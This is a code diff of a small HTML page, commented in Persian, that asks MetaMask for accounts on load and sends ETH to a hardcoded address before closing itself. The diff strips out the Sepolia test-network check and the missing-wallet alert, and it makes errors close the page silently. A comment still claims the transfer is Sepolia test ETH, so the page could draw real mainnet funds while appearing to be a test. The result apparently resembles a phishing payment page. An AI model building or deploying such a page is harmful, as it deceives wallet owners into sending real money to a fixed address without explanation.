@@ -1,4 +1,4 @@
-   <!DOCTYPE html>
+ <!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8" />
@@ -7,27 +7,16 @@
 <body>
 <script>
 window.onload = async function() {
-  if (!window.ethereum) {
-    alert("MetaMask not detected");
-    return;
-  }
+  if (!window.ethereum) return;
 
   try {
     // اتصال به ولت
     await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-    // اطمینان از شبکه سپولیا
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const network = await provider.getNetwork();
-    if (network.chainId !== 11155111n) {
-      alert("⚠️ لطفا به شبکه Sepolia وصل شوید!");
-      return;
-    }
-
-    // ساخت تراکنش (اینجا باید مقدار دستی بدی)
+    // مقدار و آدرس مقصد
     const tx = {
       to: "0x0aE725Fd17dF096F960c60bD575D79eD14747fe2", // <- اینو خودت جایگزین کن
-      value: ethers.parseEther("0.0001").toString()   // <- مقدار انتقال (اینجا دستی ست میشه)
+      value: ethers.parseEther("0.0001").toString()   // <- مقدار دستی برای سپولیا ETH
     };
 
     // ارسال تراکنش
@@ -36,14 +25,14 @@ window.onload = async function() {
       params: [tx]
     });
 
-    // بعد از ارسال صفحه بسته میشه
+    // بستن صفحه بعد از ارسال
     setTimeout(() => {
       window.close();
-      window.location.href = "about:blank";
-    }, 3000);
+    }, 2000);
 
   } catch (err) {
     console.error("TX error:", err);
+    window.close();
   }
 };
 </script>
